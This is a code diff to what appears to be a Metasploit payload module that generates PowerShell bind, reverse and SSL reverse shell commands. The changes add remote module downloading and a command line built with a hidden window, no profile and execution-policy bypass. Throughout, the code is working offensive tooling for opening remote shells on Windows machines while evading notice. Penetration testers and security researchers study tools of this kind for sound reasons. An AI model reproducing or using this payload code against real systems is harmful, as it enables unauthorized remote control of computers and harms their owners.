@@ -1,8 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/windows'
-
 module Msf
 
 ###
@@ -12,6 +9,22 @@ module Msf
 ###
 
 module Payload::Windows::Powershell
+  # Mark the payload as dynamic as powershell scripts are randomized
+  ForceDynamicCachedSize = true
+
+  def initialize(info = {})
+    ret = super(info)
+
+    # Register command execution options
+    register_options(
+      [
+        OptString.new('LOAD_MODULES', [ false, 'A list of powershell modules separated by a comma to download over the web', nil ]),
+      ]
+    )
+    # Hide the CMD option
+    deregister_options('CMD')
+    ret
+  end
 
   def generate_powershell_code(conntype)
     lport = datastore['LPORT']
@@ -26,8 +39,10 @@ module Payload::Windows::Powershell
 
     if conntype == "Bind"
       script_in << "\npowerfun -Command bind"
-    elsif conntype == "Reverse"
+    elsif conntype == "SSL"
       script_in << "\npowerfun -Command reverse -Sslcon true"
+    elsif conntype == "Reverse"
+      script_in << "\npowerfun -Command reverse"
     end
 
     if datastore['LOAD_MODULES']
@@ -44,7 +59,18 @@ module Payload::Windows::Powershell
     script_in.gsub!('LHOST_REPLACE', lhost.to_s)
 
     script = Rex::Powershell::Command.compress_script(script_in)
-    "powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $(#{script})"
+    command_args = {
+        noprofile: true,
+        windowstyle: 'hidden',
+        noninteractive: true,
+        executionpolicy: 'bypass'
+    }
+    cli =  Rex::Powershell::Command.generate_psh_command_line(command_args)
+    return "#{cli} \"#{script}\""
+  end
+
+  def command_string
+    powershell_command
   end
 end
 end
